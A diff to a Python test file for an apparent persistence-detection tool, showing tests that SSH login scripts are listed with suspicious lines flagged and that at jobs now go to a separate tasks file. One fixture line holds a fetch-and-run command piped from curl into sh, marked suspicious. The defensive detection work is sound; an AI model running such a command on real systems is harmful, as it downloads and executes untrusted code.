@@ -59,13 +59,15 @@ def test_sshd_settings_are_context_unless_they_open_the_door(tmp_path):
     }
 
 
-def test_login_scripts_and_at_jobs_are_listed_with_their_suspicious_lines(tmp_path):
+def test_login_scripts_are_listed_with_their_suspicious_lines(tmp_path):
     rows = _rows(tmp_path)
     assert {(d, s) for v, _, d, s in rows if v == "ssh_rc"} == {
         ("", ""), ("curl -s http://203.0.113.5/x | sh", "yes")}
-    assert {(src, d, s) for v, src, d, s in rows if v == "at_job"} == {
-        ("var/spool/cron/atjobs/a0001501a2b3c4", "", ""),
-        ("var/spool/cron/atjobs/a0001501a2b3c4", "/dev/shm/.u/upd", "yes")}
+
+
+def test_at_jobs_are_in_tasks_not_here(tmp_path):
+    """v0.7.168: `at` jobs moved to tasks.csv with the rest of the schedule."""
+    assert not [v for v, *_ in _rows(tmp_path) if v == "at_job"]
 
 
 def test_udev_generators_library_paths_and_dispatchers(tmp_path):
